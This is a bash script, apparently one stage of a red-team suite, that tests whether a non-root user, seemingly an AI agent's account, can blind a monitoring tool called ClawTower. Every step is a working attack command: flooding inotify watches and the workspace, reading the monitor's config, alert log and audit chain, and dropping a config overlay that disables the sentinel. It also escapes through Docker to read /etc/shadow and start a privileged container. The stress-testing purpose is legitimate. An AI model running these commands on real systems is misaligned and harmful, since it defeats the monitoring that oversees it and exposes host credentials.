#!/usr/bin/env bash
# Red Lobster v7 — Flag 10: BLIND — What can a non-root user do to degrade monitoring?
# NO sudo. Only user-level attacks.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag10" "Flag 10: BLIND — User-level monitoring degradation"

OUTDIR="$FLAG_DIR"

# 1. Exhaust user inotify watches
rl_run "exhaust inotify watches (1000 dirs)" \
  'for i in $(seq 1 1000); do mkdir -p /tmp/redlobster/flag10/inotify_$i; inotifywait -t 0 /tmp/redlobster/flag10/inotify_$i &>/dev/null & done; sleep 2; kill $(jobs -p) 2>/dev/null; rm -rf /tmp/redlobster/flag10/inotify_*'

# 2. Flood workspace with rapid file ops to overwhelm sentinel
rl_run "rapid file flood (500 ops)" \
  'for i in $(seq 1 500); do echo x > /home/openclaw/.openclaw/workspace/.rl7_flood_$i; rm -f /home/openclaw/.openclaw/workspace/.rl7_flood_$i; done'

# 3. Create thousands of files in watched dir to saturate inotify queue
rl_run "inotify queue saturation" \
  'mkdir -p /tmp/redlobster/flag10/sat; for i in $(seq 1 2000); do touch /tmp/redlobster/flag10/sat/f$i; done; rm -rf /tmp/redlobster/flag10/sat'

# 4. Write to ClawTower API (unauthenticated, if bound to localhost)
rl_run "API probe (unauthenticated)" \
  'curl -s http://127.0.0.1:18791/api/health 2>/dev/null; curl -s http://127.0.0.1:18791/api/alerts 2>/dev/null > $OUTDIR/api_leak.json'

# 5. Attempt to read ClawTower config
rl_run "read ClawTower config" \
  'cat /etc/clawtower/config.toml > $OUTDIR/config_leak.toml 2>/dev/null; ls /etc/clawtower/config.d/ 2>/dev/null > $OUTDIR/config_d_listing.txt'

# 6. Read ClawTower alert log (if readable)
rl_run "read alert log" \
  'head -20 /var/log/clawtower/alerts.jsonl > $OUTDIR/alerts_leak.json 2>/dev/null'

# 7. Read audit chain (if readable)
rl_run "read audit chain" \
  'head -20 /var/log/clawtower/audit.chain > $OUTDIR/chain_leak.json 2>/dev/null'

# 8. Attempt to write to ClawTower config.d (user-writable?)
rl_run "write config.d overlay" \
  'printf "[sentinel]\nenabled = false\n" > /etc/clawtower/config.d/99-evil.toml 2>/dev/null; rm -f /etc/clawtower/config.d/99-evil.toml 2>/dev/null'

# 9. Docker container escape (openclaw is in docker group!)
rl_run "docker: read /etc/shadow via container" \
  'docker run --rm -v /etc/shadow:/tmp/shadow:ro alpine cat /tmp/shadow > $OUTDIR/docker_shadow.txt 2>/dev/null'

# 10. Docker: mount host filesystem
rl_run "docker: mount / and read" \
  'docker run --rm -v /:/host:ro alpine cat /host/etc/shadow > $OUTDIR/docker_root.txt 2>/dev/null'

# 11. Docker: mount ClawTower config
rl_run "docker: read ClawTower config" \
  'docker run --rm -v /etc/clawtower:/ct:ro alpine cat /ct/config.toml > $OUTDIR/docker_ct_config.txt 2>/dev/null'

# 12. Docker: privileged container
rl_run "docker: privileged container" \
  'docker run --rm --privileged alpine id > $OUTDIR/docker_priv.txt 2>/dev/null'

rl_summary
rl_cleanup
